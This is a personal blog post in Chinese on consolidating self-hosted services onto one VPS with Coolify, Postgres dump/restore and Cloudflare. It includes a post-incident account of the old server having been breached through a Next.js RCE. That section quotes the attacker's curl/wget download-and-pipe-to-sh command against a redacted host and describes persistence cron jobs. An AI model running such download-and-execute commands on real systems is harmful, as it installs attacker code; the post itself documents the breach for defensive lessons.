---
icon: material-symbols:menu-book-outline
date: 2026-10-22
isOriginal: true
category:
  - notes
tag:
  - VPS
  - 网络
  - AI
---

# 搬服务器：一年省一半，还发现旧机器早被黑了

去年，我在服务器上花了 $824；今年，只要 $409。省下一半，靠的是一次搬家：把散在 Zeabur 和一台旧服务器上的十几个服务，收进一台小 VPS 里。

但这次搬家最大的收获不是省钱。清点旧服务器的时候，我发现它早就被人黑了，而且已经潜伏了十个月。

<!-- more -->

![十几个服务从两个旧家搬进一台新 VPS](/assets/images/migrate-vps-overview.jpg)

> 文中的域名、IP、密码都用占位符代替，攻击者的地址已打码。

## 为什么要搬

起因是两件事撞到了一起：

- **Zeabur 年底关停。** 我的三个前端、一个 Bun 后端，还有密码管理器（Vaultwarden），都在上面。
- **旧服务器快到期。** 上面用 systemd 跑着几个后端，PostgreSQL 和 Redis 是我自己编译装的。每次部署都要 SSH 上去 `git pull`，再手动重启。

反正都要动，不如一次收拢到一台机器上，顺便把部署方式也换掉。

## 先算账

| 项目 | 之前 | 现在 |
|---|---|---|
| Zeabur | $30/月 = $360/年 | 已关闭 |
| 旧服务器 | $260/年 | 到期不续 |
| 新 VPS（Vultr 东京） | — | $20/月 = $240/年 |
| 代理 | 买机场 $17/月 = $204/年 | 自建搬瓦工 $169/年 |
| **合计** | **$824/年** | **$409/年** |

![一年省下 $415](/assets/images/migrate-vps-cost.jpg)

一年省下 **$415**，刚好一半。代理那部分是两周前做的，过程写在[《从买一台搬瓦工 VPS 到自建代理》](./vps-to-vpn.md)，这篇只讲服务和数据库的迁移。

## 新家：Vultr 东京 + Coolify

**机器**选的是 Vultr 东京，2 核 4G、80G 硬盘，$20/月。东京国内访问延迟还行，也不用备案。买完先从国内测了一遍，确认没被墙、延迟能接受，才往下做。

**部署平台**是 [Coolify](https://coolify.io)，一个开源的自托管 PaaS，可以理解成自己搭的 Zeabur / Vercel：

- 连上 GitHub，push 代码就自动构建部署；
- 自带 Traefik 反向代理，自动申请 Let's Encrypt 证书；
- 数据库一键部署，带定时备份到 S3；
- 每个服务能设环境变量、内存上限、定时任务。

安装只要一条命令：

```bash
curl -fsSL https://cdn.coollabs.io/coolify/install.sh | bash
```

装完我先在设置里关了三样东西：自动更新（避免半夜自己升级出问题，改成手动升）、遥测、营销邮件。

域名上，给面板配一个子域名，再加一条泛解析 `*.coolify.example.com` 指向服务器。以后每个服务都会自动分到一个 `xxx.coolify.example.com`，不用每次去加 DNS。

## 服务怎么搬

先列清单：

| 原来在哪 | 服务 | 去了哪 |
|---|---|---|
| Zeabur | 3 个 Next.js / Vite 前端 | Coolify |
| Zeabur | 1 个 Bun 后端 | Coolify |
| Zeabur | 密码管理器（Vaultwarden） | Coolify，重新部署 |
| Zeabur | IT-Tools、Excalidraw 等小工具 | Cloudflare |
| 旧服务器 | Bun API + 后台 worker | Coolify |
| 旧服务器 | 2 个 Go 后端 | Coolify |
| 旧服务器 | PostgreSQL 17、Redis | Coolify 里的共享 PostgreSQL 18、Redis |
| 旧服务器 | 没人用的老项目 | 不迁，数据库导出存档 |

### 有源码的：直接连 GitHub

在 Coolify 里装好 GitHub App，选仓库和分支，构建方式选 Dockerfile 或 Nixpacks，填好端口和域名就行。环境变量从旧平台原样搬过来，只把数据库、Redis 的地址换成新的。

**搬之前把配置里的所有 URL 都过一遍。** 我有一个后端，旧平台的回调地址写死在配置文件里，差点漏掉。

### 机器太小，构建放到 GitHub Actions

有一个 Next.js 的 monorepo，在 2 核 4G 的机器上一构建，内存就吃满，其他服务也跟着卡。做法是：

1. 在 GitHub Actions 里构建 Docker 镜像，推到 GHCR；
2. Coolify 里这个服务改成「从镜像部署」，构建完用 webhook 通知它去拉新镜像。

服务器只管跑，不管编译，稳定多了。

### 一个镜像，两个进程

Bun 的 API 和后台 worker 是同一份代码，入口不同。Coolify 里建两个应用指向同一个仓库，worker 那个在「自定义 Docker 参数」里覆盖入口：

```
--entrypoint "bun run src/workers/index.ts"
```

worker 不需要域名，也不需要健康检查。

### 只有二进制、没有源码的

旧服务器上有两个 Go 服务，源码早就找不到了，只剩编译好的二进制。这种也能上 Coolify：建一个私有仓库，放进二进制和一个很短的 Dockerfile，用非 root 用户运行；配置文件不进镜像，用 Coolify 的「文件挂载」挂进容器。

```dockerfile
FROM alpine:3.22
RUN adduser -D app
WORKDIR /app
COPY server /app/server
USER app
CMD ["/app/server", "-c", "/app/config/config.json"]
```

> 坑：Coolify 文件挂载第一次生成的文件是空的（临时文件权限不对，Coolify 读不到内容），容器一启动就报配置错误。遇到这种情况，先进容器 `cat` 一下挂载的文件。

## 数据库：先瘦身，再搬

### 一个共享实例，每个应用一个库

Coolify 里只部署了**一个 PostgreSQL 18**，所有应用共用，但每个应用有自己的库和用户：

```sql
CREATE ROLE app1 LOGIN PASSWORD '...';
CREATE DATABASE app1 OWNER app1;
REVOKE CONNECT ON DATABASE app1 FROM PUBLIC;
```

最后一行很重要：默认所有用户都能连所有库，收回之后，一个应用的密码漏了，也碰不到别人的数据。比起每个应用一个数据库容器，共享实例省很多内存。数据库只在 Docker 内网暴露，不开公网端口。Redis 同理，部署一个共享的，带密码，开 AOF 持久化。

### 迁移前先瘦身

导出前先看了一眼每个库有多大，有两个大得离谱：

- 一个 **900M** 的库，大部分是 worker 每轮空转都要写一条的运行日志，还有几乎没人看的价格快照；
- 一个 **1G** 的库，97% 是每小时一份、内容完全重复的账户快照。

改了代码，只在真正处理了东西时才写日志，再给快照表加上定时清理。清完之后，两个库分别剩 **66M** 和 **11M**。**搬家前先查查哪些表最大，很可能一大半都不用搬。**

```sql
SELECT relname, pg_size_pretty(pg_total_relation_size(relid))
  FROM pg_catalog.pg_statio_user_tables
 ORDER BY pg_total_relation_size(relid) DESC LIMIT 10;
```

### 跨大版本：dump + restore

从 17 升到 18，不能直接拷数据目录，要用逻辑导出：

```bash
# 旧服务器：导出成自定义格式（自带压缩，可以选择性恢复）
pg_dump -Fc -d app1 > app1.dump

# 新服务器：导入到共享实例
pg_restore --no-owner --role=app1 -d app1 app1.dump
```

`--no-owner` 加 `--role` 让所有对象都归新用户，不用管旧库的用户名。升大版本之前，我先在本地用 postgres:18 的镜像把整套测试跑了一遍，结果一致才上线。

### 切换顺序最重要

![切换顺序：停旧服务一定要在导出之前](/assets/images/migrate-vps-cutover.jpg)

每个服务都按这个顺序切：

1. **新服务先部署好**，连上新数据库（空库），确认能启动；
2. **停掉旧服务**，确保没人再写旧库；
3. **导出、导入**，然后对比每张表的行数；
4. **重启新服务**，验证接口；
5. **改 DNS**，指向新服务器；
6. **旧服务和旧库留着不删**，出问题随时能切回去。

第 2 步一定要在第 3 步前面，不然停机前那几分钟写进旧库的数据就丢了。停机时间基本就是导入那几分钟。

## Cloudflare 帮了哪些忙

### DNS：橙色云朵和证书的坑

域名本来就在 Cloudflare，切服务改一条 A 记录就行，几分钟生效。

> 坑一：记录开着 Cloudflare 代理（橙色云朵），而 SSL 设置会把 HTTP 自动跳到 HTTPS。Coolify 申请 Let's Encrypt 证书时走的 HTTP 验证请求被跳走了，证书一直签不下来，只能用 Traefik 的默认证书。
>
> 解决办法：先把记录改成「仅 DNS」（灰色云朵），等证书签好再决定要不要开代理；或者 SSL 模式用「完全」而不是「完全（严格）」。

> 坑二在我自己电脑上：`/etc/hosts` 里很久以前为了调试写死过旧服务器的 IP。切完 DNS，我这边一直打开的是旧服务器，还以为没切成功。

切完之后，记得把指向旧服务器、已经没内容的 DNS 记录删掉。

### R2、Pages、Workers

- **R2 放备份。** 兼容 S3，前 10G 免费，下载不收流量费。Coolify 的数据库备份直接填 R2 的地址和密钥：每天凌晨 `pg_dumpall` 一次，本地留 7 份，R2 留 30 份。旧服务器下线前，我把上面所有的库（包括不迁移的老项目）都单独 `pg_dump` 一份放进 `old-server-archive/`，上传完再下载回来校验一遍 sha256。
- **Pages / Workers 放静态小工具。** IT-Tools、Excalidraw 这类纯前端工具，没必要占服务器资源，直接部署到 Cloudflare，免费、全球 CDN。顺手又加了一个文件快传和一个图床。
- **状态页用 [UptimeFlare](https://github.com/lyc8503/UptimeFlare)**，跑在 Workers 上，定时从 Cloudflare 的节点检查所有服务。监控不在被监控的机器上，服务器挂了也能发现。检查不只看状态码，还可以要求返回内容里包含某个关键字，比如 API 要能返回数据库里的数据才算正常。

## 小机器上的资源管理

2 核 4G 跑十几个容器，内存最紧：

- **每个服务都设内存上限。** 超了只会杀掉这一个容器再拉起来，不会拖垮整台机器。
- **吃内存的服务定时重启。** Coolify 的定时任务是在容器**里面**执行命令，没法重启容器本身。我在宿主机加了一条 cron，按 Coolify 给容器打的标签找到它再 `docker restart`，重新部署后容器名变了也不受影响。
- **定期清镜像。** 每次部署都会留下旧镜像和构建缓存，第一次清理就腾出了 13G。Coolify 服务器设置里有自动清理磁盘的选项，可以打开。

目前所有服务加起来，内存 1.7G 左右，CPU 负载 0.7，很宽裕。

## 意外：旧服务器早就被黑了

搬到最后，清点旧服务器的时候，我发现了一件后背发凉的事：`appuser` 的 crontab 里多了几行我没写过的命令，家目录里还藏着一个加了壳的程序。顺着日志查下去，入口是一个我早就忘了的 Next.js 文档站。

### 时间线

| 时间（北京时间） | 发生了什么 |
|---|---|
| 2025-12-03 | React Server Components 公开远程代码执行漏洞（React2Shell，CVE-2025-55182，CVSS 10.0），Next.js 在影响范围内，几天内全网开始批量扫描 |
| 2025-12-06 19:57 | 攻击者通过文档站（Next.js 15.0.3）执行命令，放下 `/home/appuser/.rsyslo/rsyslo` |
| 2025-12-07 00:51 | `appuser` 的定时任务里被写进恶意任务 |
| 2025-12-07 01:14 | 文档站的错误日志最后一次记下攻击命令 |
| 2026-10 | 迁移清点时才发现，前后约 10 个月 |

### 它做了什么

**第一步：一个请求，执行一条命令。** 文档站的错误日志里能看到攻击者让它执行的命令：

```bash
(curl -fsSL -m180 https://pub-████.r2.dev/favicon.ico || wget -T180 -q https://pub-████.r2.dev/favicon.ico) | sh
```

从攻击者的 R2 下载一个伪装成网站图标的脚本，直接交给 `sh` 执行。日志里有几次 `Command failed`，但后来服务器上出现了木马和定时任务，说明至少成功了一次。

![脚本放下的木马 rsyslo](/assets/images/migrate-vps-rsyslo.jpg)

**第二步：放下木马。** 程序叫 `rsyslo`，名字伪装成系统日志服务 rsyslog，藏在隐藏目录 `.rsyslo` 里。它是一个 1.4M 的 Linux 可执行文件，做了加壳，读不出里面的内容，所以没法确定它具体做什么。这一波 React2Shell 攻击绝大多数是装挖矿程序，它很可能也是，但没有证实。

![定时任务：每天两次重新下载](/assets/images/migrate-vps-crontab.jpg)

**第三步：写进定时任务。** 一共 4 条，实际是 2 条各重复写了一遍，每天两次（UTC 03:30 和 15:30）执行：

- 从 R2 下载一个叫 `corn` 的程序，运行完就删掉，不留痕迹；
- 从一个 AWS S3 存储桶下载 `favicon1.ico`，同样直接交给 `sh` 执行。

这样就算木马被删了，每天也会被重新装两次。

**脚本本体已经拿不到了。** 我检查时两个下载地址都已失效：S3 存储桶已经被删除，R2 地址被 Cloudflare 当作钓鱼网站拦截了，能下载到的只有两个错误页面。所以它到底做了什么，现在只能推测。

还好，从记录看，它没去翻我的密钥。不然，我加密钱包里那 $200，就又要被扫走一次了。

### 教训

- **不用的服务就停掉。** 跑着没人管的服务，才是最大的风险。
- **框架的安全更新要跟。** Next.js、React 这类框架出了高危漏洞，几天内就会被批量扫描；迁移时顺便检查一下所有服务的版本。
- **上面用过的密钥全部换掉。** 机器被入侵过，光把服务迁走是不够的。
- **被黑过的机器不再用。** 数据导出存档之后，直接退订。

## 总结

整个迁移花了两天左右，大部分时间不是在搬，而是在清理：给数据库瘦身，删掉没用的服务，补上监控和备份。搬完之后：

- 一年的花费从 $824 降到 $409；
- push 代码就自动部署，不用再 SSH 上去手动操作；
- 数据库每天自动备份到 R2，状态页盯着每个服务；
- 一台机器、一个面板，管理起来清楚多了。

这次搬家大部分操作是 Claude Code 帮我做的：SSH 上去、调 Coolify 的 API 部署服务、导数据库、对比行数，我主要负责拍板和验收。

如果你手上也有几台零散的服务器或者几张 PaaS 账单，可以试试收进一台机器里。顺便查一查，上面还跑着哪些你早就忘了的服务。
